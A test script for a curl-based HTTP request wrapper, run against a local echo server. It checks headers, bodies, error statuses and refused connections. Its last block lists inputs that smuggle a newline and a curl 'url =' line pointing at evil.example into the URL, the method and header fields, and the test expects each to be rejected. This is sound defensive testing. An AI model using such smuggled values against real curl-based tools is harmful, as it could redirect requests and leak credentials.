/* Needs tests/echo_server.py listening on $ECHO_PORT (run.sh starts it). */
import { eq, ok, done } from 'lib';
import { httpRequest } from 'hyper';

const base = `http://127.0.0.1:${getenv('ECHO_PORT') || '18765'}`;

/* GET with headers; secrets must arrive intact */
let res = httpRequest('GET', base + '/v1/public/user/info?a=1', {
	'Authorization': 'Bearer eyJ.tricky"quote\\backslash',
	'Login-Type': 'device',
	'Skip': null
});
let echo = json(res.body);
eq('get status', res.status, 200);
eq('get error', res.error, null);
eq('get method', echo.method, 'GET');
eq('get path+query', echo.path, '/v1/public/user/info?a=1');
eq('auth header', echo.headers.authorization, 'Bearer eyJ.tricky"quote\\backslash');
eq('login-type header', echo.headers['login-type'], 'device');
ok('null header skipped', !('skip' in echo.headers));

/* POST JSON body with unicode and quotes */
const body = { email: 'a@b.c', password: 'p"w\\d 密码', n: 1 };
res = httpRequest('POST', base + '/v1/auth/login', { 'Content-Type': 'application/json' }, body);
echo = json(res.body);
eq('post status', res.status, 200);
eq('post body roundtrip', json(echo.body), body);
eq('post content-type', echo.headers['content-type'], 'application/json');

/* raw string body */
res = httpRequest('PUT', base + '/x', null, 'plain text');
eq('string body', json(res.body).body, 'plain text');

/* non-2xx is reported, not an error */
res = httpRequest('GET', base + '/status/401');
eq('401 status', res.status, 401);
eq('401 error', res.error, null);

/* connection refused -> error, status 0 */
res = httpRequest('GET', 'http://127.0.0.1:1/', null, null, 3);
eq('refused status', res.status, 0);
ok('refused error', type(res.error) === 'string' && length(res.error) > 0);

/* a line break in any curl config value is refused before curl runs */
for (let bad in [
	[ 'GET', base + '/x\nurl = "http://evil.example/', {} ],
	[ 'GET', base + '/x', { 'Idempotency-Key': 'abcdefgh\nurl = "http://evil.example/' } ],
	[ 'GET\nurl = "http://evil.example/', base + '/x', {} ],
	[ 'GET', base + '/x', { 'X\nurl': 'v' } ],
	[ 'GET', base + '/x', { 'Idempotency-Key': 'abcdefgh\u0000\nurl = "http://evil.example/' } ]
]) {
	res = httpRequest(bad[0], bad[1], bad[2]);
	eq(`refused ${sprintf('%J', bad)}`, [ res.status, res.error ], [ 0, 'illegal character in request' ]);
}

done('http');
